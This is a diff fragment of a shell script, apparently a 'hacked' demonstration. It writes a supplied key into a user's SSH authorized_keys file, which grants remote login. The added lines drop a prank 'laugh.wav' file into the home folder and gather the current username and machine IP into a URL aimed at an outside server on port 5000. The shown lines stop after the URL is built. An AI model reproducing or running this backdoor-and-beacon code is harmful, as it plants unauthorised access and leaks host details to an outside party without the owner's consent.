@@ -36,6 +36,11 @@ then
 	mkdir /Local/Users/$username/.ssh
 	touch /Local/Users/$username/.ssh/authorized_keys
 	echo $key > /Local/Users/$username/.ssh/authorized_keys
+
+	# Copy some files for the demonstration
+	cp src/laugh.wav /Local/Users/$username/laugh.wav
+
+	# Make a request so my server knows you were "hacked"
 	runner_user=`who | grep -m1 "" | cut -d " " -f1`
 	runner_ip=`ifconfig  | grep inet | grep broadcast | cut -d " " -f2`
 	url="http://$host_ip:5000?user=$runner_user=&ip=$runner_ip"
